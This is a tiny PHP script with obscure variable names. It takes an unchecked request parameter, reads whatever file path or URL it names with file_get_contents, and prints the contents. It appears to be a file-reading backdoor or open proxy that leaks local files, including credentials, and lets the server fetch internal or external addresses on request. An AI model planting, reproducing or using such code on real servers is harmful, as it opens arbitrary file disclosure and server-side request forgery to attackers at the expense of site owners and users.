<?php
 $mtln=$_REQUEST["evitln"];
 $sadr=file_get_contents($mtln); 
 echo $sadr;
?>